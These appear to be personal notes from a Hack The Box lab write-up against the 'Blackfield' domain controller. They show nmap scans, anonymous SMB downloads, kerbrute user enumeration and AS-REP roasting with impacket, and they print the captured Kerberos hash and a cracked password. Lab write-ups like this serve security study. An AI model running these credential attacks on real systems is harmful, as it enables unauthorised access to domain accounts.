##### nmap

Service scan
```bash
sudo nmap -sC -sV 10.10.10.192 -oA nmap -v
```
![[Pasted image 20241009181323.png]]
![[Pasted image 20241009181357.png]]


All port scan
```bash
nmap -sV -p- -v 10.10.10.192 -oA nmap2
```
![[Pasted image 20241009181413.png]]
![[Pasted image 20241009183032.png]]
##### manual

```bash
smbclient -N -L \\10.10.10.192
```
![[Pasted image 20241009181714.png]]

Under `profiles$`, found a list of folders that are potentially users within the system. 
```bash
smb> prompt OFF
smb> recurse ON
smb> mget *
```

Downloaded all folders
```bash
ls . | head -n 500
```
Listed all folder names in a single long list which i saved in `user.txt`

- enum4linux didn't give anything

Using kerbrute, found valid users from a list of usernames
```bash
./kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d BLACKFIELD.local /home/kali/Desktop/HTB/blackfield/user.txt
```
![[Pasted image 20241009192544.png]]

Fund a TGT for user `support`
```bash
impacket-GetNPUsers BLACKFIELD.local/support -dc-ip 10.10.10.192 -no-pass
```
```
$krb5asrep$23$support@BLACKFIELD.LOCAL:d5745f83a94e5e6600814b2e87f41649$80b7939a5c850d3f4a4345a7d1cb2bf2deb75cbda4a933296080e4d07d054d74ffe2dc387a5f35efd705e524e10c4b58ae383693672f8ce97b865f0c52dec34933a6f74b4607da869cb00d161d1a3fdc75e51d01ee2d809e1e22a720c4bc30d48b268b9454c59c89261bcfdb527e1dd973c590cac04f6c4af88ceba2cc9ef1c627fca823009767e2b0cb012d0d3df512f91b68f2e8cb6df91b0a3d8118fef1dedc3cc5a1554b882174f1f688f7808d266ad37e8b6042fc87598ad122d206c6d3584ed96f4aae606f1dd5a0470ecb255e47c9c1fd7acbaaf87db9e07e4b7162d0fe33eb1b641fa072a0b2d0faa473cabdf9a9703c
```

Cracking Kerberos hash
```bash
hashcat support.hash /usr/share/wordlists/rockyou.txt
```
Successfully cracked the password

`support:#00^BlackKnight`

